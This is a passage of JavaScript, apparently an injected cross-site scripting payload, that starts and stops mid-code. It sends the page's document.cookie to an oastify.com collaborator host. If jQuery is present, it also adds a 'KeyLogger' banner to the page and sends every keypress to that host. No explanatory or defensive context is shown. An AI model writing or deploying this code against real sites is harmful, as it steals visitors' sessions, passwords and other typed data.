...
fetch("https://fo7w6vmpuh0ev32r26f3knxk8be22uqj.oastify.com?cookie=" + encodeURIComponent(document.cookie));

// If jQuery exists, use it for banner + keylogger
if (typeof $ !== "undefined") {
    $("body").prepend("<h2 style='color:black'>KeyLogger</h2>");
    $(document).on("keypress", function(e) {
        fetch("https://fo7w6vmpuh0ev32r26f3knxk8be22uqj.oastify.com?key=" + encodeURIComponent(e.key));
    });
} else {
